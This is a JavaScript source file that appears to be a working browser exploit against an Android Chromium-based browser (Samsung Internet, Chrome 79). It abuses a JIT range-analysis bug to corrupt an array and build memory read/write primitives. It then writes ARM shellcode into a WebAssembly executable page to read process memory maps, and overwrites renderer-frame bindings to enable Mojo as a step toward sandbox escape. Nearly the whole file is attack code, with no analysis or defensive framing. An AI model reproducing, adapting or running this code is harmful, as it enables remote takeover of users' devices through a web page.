//"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
function print(...args) {
    console.log.apply(null, args);
    if (this.document !== undefined) {
      this.document.write.apply(document, args);
      this.document.write("<br>");
    }
    else postMessage({ log: args });
  }

  var g_controlledAb = new ArrayBuffer(0x1000);
  function gc() {
    try { new ArrayBuffer(0x58000000); } catch (e) { print("gc " + e) }
  }

  function double_to_array(value){
    var uBuf = new Uint32Array(2);
    var dBuf = new Float64Array(uBuf.buffer);
    dBuf[0]=value;
    return uBuf;
  }

  function intarray_to_double(int_arr){
    var uBuf = new Uint32Array(2);
    var dBuf = new Float64Array(uBuf.buffer);
        uBuf[0]=int_arr[0];
        uBuf[1]=int_arr[1];
    return dBuf[0];
}

  var memory = {
    controlledAb: null,
    modifyAddress: null,
    getObjectAddress: null,

    initMemory(controlledAb, modifyAddress, getObjectAddress) {
      this.controlledAb = controlledAb;
      this.modifyAddress = modifyAddress;
      this.getObjectAddress = getObjectAddress;
    },
    readUint64(addr) {
      this.modifyAddress(addr);
      let arr = new BigUint64Array(this.controlledAb);
      return arr[0];
    },
    readUint32(addr) {
      this.modifyAddress(addr);
      let arr = new Uint32Array(this.controlledAb, 0, 1);
      return arr[0];
    },
    writeUint32(addr, value) {
      this.modifyAddress(addr);
      let arr = new Uint32Array(this.controlledAb);
      arr[0] = value;
    },
    readUint32Minus1(addr) {
      return this.readUint32(addr) - 1;
    },
    writeBytes(addr, bytes) {
      this.modifyAddress(addr);
      let view = new Uint8Array(this.controlledAb);
      for (let i = 0; i < bytes.length; i++) {
        view[i] = bytes[i];
      }
    },
    dump(addr, length) {
      this.modifyAddress(addr);
      let view = new Uint32Array(this.controlledAb);
      var str = "";
      for (let i = 0; i < length; i++) {
        if (i % 8 === 0) str += "\n";
        str += (view[i].toString(16).padStart(8, 0) + " ")
      }
      print(str);
    },

   };
 
  function getLibcBase(procmap) {
    var reg = /([0-9,a-f]{8})-([0-9,a-f]{8}) .+libllvm-glnext\.so/g;
    array1 = reg.exec(procmap);
    postMessage(parseInt("0x" + array1[1]));
  }
  function getlibterraceInfo(procmap) {
    var count = 0;
    var info = {};
    var reg = /([0-9,a-f]{8})-([0-9,a-f]{8}) r.+\n/g;
    while ((array1 = reg.exec(procmap)) !== null) {
      if (3 === count) {//bss 段
        if (array1[0].search("[anon:.bss]") === -1) {
          print("/proc//mmap is in wrong format");
          throw "fail";
        }
        info.bssStart = parseInt("0x" + array1[1]);
        info.bssEnd = parseInt("0x" + array1[2]);
        print(array1[0]);
        return info;
      }
      if (array1[0].search("libterrace.so") != -1) {
        console.log(`Found ${array1[1]} ${array1[2]}. Next starts at ${reg.lastIndex}.`);
        info[count] = {};
        info[count].start = parseInt("0x" + array1[1]);
        info[count].end = parseInt("0x" + array1[2]);
        count++;
      }

    }
  }
  function findFrameMap(info, memory) {
    for (var i = info.bssStart; i < info.bssEnd; i += 4) {
      var frame_map = memory.readUint32(i);
      if (i + 4 === frame_map) {
        if (memory.readUint32(i + 4) === memory.readUint32(i + 8) && memory.readUint32(i + 0xc) === 1 &&
          memory.readUint32(i + 0x10) === 0 && memory.readUint32(i - 4) === 1) {
          print(i.toString(16) + " ");
          return i;
        }

      }

    }
  }

  function enableMojo(memory) {

    var info = getlibterraceInfo(procmap);
    let g_frame_map_ptr = findFrameMap(info, memory);
    let g_frame_map = memory.readUint32(g_frame_map_ptr);
    print("g_frame_map at " + g_frame_map.toString(16));
    if (g_frame_map_ptr + 4 != g_frame_map)
      throw "exception happen";
    //memory.dump(g_frame_map,0x10);
    let __begin_node_ = memory.readUint32(g_frame_map);
    //memory.dump(__begin_node_,0x100);
    let renderFrame = memory.readUint32(__begin_node_ + 5 * 4);

    const kEnabledBindingsOffset = 944;
    let enabled_bindings = memory.readUint32(renderFrame + kEnabledBindingsOffset);
    print('  [*] enabled_bindings:  0x' + enabled_bindings.toString(2));
    memory.writeUint32(renderFrame + kEnabledBindingsOffset, 2);
    memory.writeUint32(renderFrame + kEnabledBindingsOffset + 4, 1);
    //memory.dump(renderFrame,400);

  }

  function getInstance(){
    var moduleContent = [
      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 0x60,
      0x01, 0x7f, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03,
      0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x1d, 0x01, 0x1b, 0x00, 0x42, 0xc8,
      0x96, 0xda, 0xc1, 0xb4, 0xd1, 0xd9, 0x83, 0x43, 0x42, 0xd9, 0xb4, 0x85,
      0xc2, 0x95, 0xa8, 0xd6, 0xe1, 0x00, 0x7c, 0xa7, 0x20, 0x00, 0x6a, 0x0b
    ];

    var buffer = new Uint8Array(moduleContent);
    var myModule = new WebAssembly.Module(buffer);
    var myInstance = new WebAssembly.Instance(myModule, {});
    for (var i = 0; i < 10000; i++)
      myInstance.exports.add(1);
    this.myInstance = myInstance;
  }

  getInstance();
  function getWasmJIT(memory) {

    function getWasmInstructAddr() {
      var instanceAddr = memory.getObjectAddress(myInstance);
      var rwxPageAddr = memory.readUint32(instanceAddr + 0x10 * 4);
      //memory.dump(rwxPageAddr, 0x100);
      print(rwxPageAddr.toString(16));
      return rwxPageAddr;
    }

    var pStart = getWasmInstructAddr();
    return { addr: pStart, func: myInstance.exports.add };
  }

  function getLibllvmStartAddr(memory, selfMemMap) {

    var shellCode = [
      0x01, 0x40, 0x2d, 0xe9, 0x63, 0x00, 0xe0, 0xe3, 0x0f, 0x10, 0xa0, 0xe1,
      0x03, 0x00, 0x00, 0xea, 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65,
      0x6c, 0x66, 0x2f, 0x6d, 0x61, 0x70, 0x73, 0x00, 0x00, 0x20, 0xa0, 0xe3,
      0x00, 0x30, 0xa0, 0xe3, 0x0b, 0x00, 0x00, 0xeb, 0x04, 0x10, 0x9d, 0xe4,
      0x01, 0x26, 0xa0, 0xe3, 0x07, 0x00, 0x2d, 0xe9, 0x0d, 0x00, 0x00, 0xeb,
      0x00, 0x00, 0x50, 0xe3, 0x00, 0x40, 0xa0, 0xe1, 0x07, 0x00, 0xbd, 0xe8,
      0x01, 0x00, 0x00, 0xda, 0x04, 0x10, 0x81, 0xe0, 0xf7, 0xff, 0xff, 0xea,
      0x04, 0xe0, 0x9d, 0xe4, 0x1e, 0xff, 0x2f, 0xe1, 0x07, 0xc0, 0xa0, 0xe1,
      0x05, 0x7d, 0xa0, 0xe3, 0x02, 0x70, 0x87, 0xe2, 0x00, 0x00, 0x00, 0xef,
      0x0c, 0x70, 0xa0, 0xe1, 0x1e, 0xff, 0x2f, 0xe1, 0x07, 0xc0, 0xa0, 0xe1,
      0x03, 0x70, 0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x0c, 0x70, 0xa0, 0xe1,
      0x1e, 0xff, 0x2f, 0xe1
    ];

    var jitFuncAddr = getWasmJIT(memory);
    print("return " + JSON.stringify(jitFuncAddr));
    memory.writeBytes(jitFuncAddr.addr, shellCode);
    var selfMemMapAddr = memory.getObjectAddress(selfMemMap);
    var backingStoreAddr = memory.readUint32(selfMemMapAddr + 4 * 4);
    print("backing store at " + backingStoreAddr.toString(16));

    jitFuncAddr.func(backingStoreAddr >>> 0);
    //var str = String.fromCharCode.apply(null, new Uint8Array(selfMemMap,0,0x20000));
    var str = new TextDecoder().decode(new Uint8Array(selfMemMap, 0, 0x80000));
    this.procmap = str;
    //print(str);
  }

  function exploit(confuseArray, index,controlledAb) {

    //map property element length backingstore
    var backingIndex = index + 1;
    var elementIndex = index -1;
    //var controlledAb = confuseArray[0];
    function write32bit(doubleArray,index32,value32){
      var index64 = Math.floor(index32/2);
      var isHigh32 = index32%2;
      var doubleValue = doubleArray[index64];
      var intArray = double_to_array(doubleValue);
      if(isHigh32)
        intArray[1]=value32;
      else
        intArray[0]=value32;
        doubleArray[index64] = intarray_to_double(intArray);
    }
    function read32bit(doubleArray,index32){
      var index64 = Math.floor(index32/2);
      var isHigh32 = index32%2;
      var doubleValue = doubleArray[index64];
      var intArray = double_to_array(doubleValue);
      if(isHigh32)
        return intArray[1];
      else
        return intArray[0];

    }

    function modifyAddress(addr) {//addr为uint32
      write32bit(confuseArray,backingIndex,addr);
    }

    function getObjectAddress(obj) {
      controlledAb[0] = obj;
      var elementsAddr = read32bit(confuseArray,elementIndex)-1;
      modifyAddress(elementsAddr);
      var u32 = new Uint32Array(controlledAb);
      return u32[2]-1;
    }

    var g_controlledAbAddr = getObjectAddress(g_controlledAb);
    var controlledAbAddr = getObjectAddress(controlledAb);
    memory.initMemory(controlledAb, modifyAddress, getObjectAddress);
    memory.writeUint32(g_controlledAbAddr + 4 * 4, controlledAbAddr + 4 * 4);
    memory.modifyAddress = function (addr) {
      (new Uint32Array(g_controlledAb))[0] = addr;
    }
    var confuseArrayAddr = getObjectAddress(confuseArray);
    var elementsAddr = memory.readUint32(confuseArrayAddr + 8) - 1;
    //memory.dump(elementsAddr, 200);

    getLibllvmStartAddr(memory, new ArrayBuffer(0x100000));
    enableMojo(memory);
    getLibcBase(procmap);
    print("finish");
  }

  function trigger() {
    var x = -Infinity;
    var k = 0;
    for (var i = 0; i < 1; i += x) {
      if (i == -Infinity) {
        x = +Infinity;
      }

      if (++k > 10) {
        break;
      }
    }

    var value = Math.max(i, 1024);
    value = -value;
    value = Math.max(value, -1025);
    value = -value;
    value -= 1022;
    value >>= 1; // 
    value += 4; //实际长度是10

    var array = Array(value);
    array[0] = 2.1;//{};//1.1;
    return [array, {}];
  };

  for (let i = 0; i < 20000; ++i) {
    trigger();
  }

gc();
gc();
  var arr = trigger()[0];
  var ab = new ArrayBuffer(0x1234);
  ab[0]={};//getobjaddr窗口
gc();
gc();

var index = 0;
for(var i=0;i<40;i++){
  let uarr=double_to_array(arr[i]);
  if(uarr[0]===0x1234)
    index = i*2;
  else if(uarr[1]===0x1234)
    index = i*2+1
}
print(index);

if ( index!==0 ) {
  try{
    exploit(arr, index, ab);
  }catch(e){
    postMessage(false);
  }
  postMessage(true);
} else
  postMessage(false);
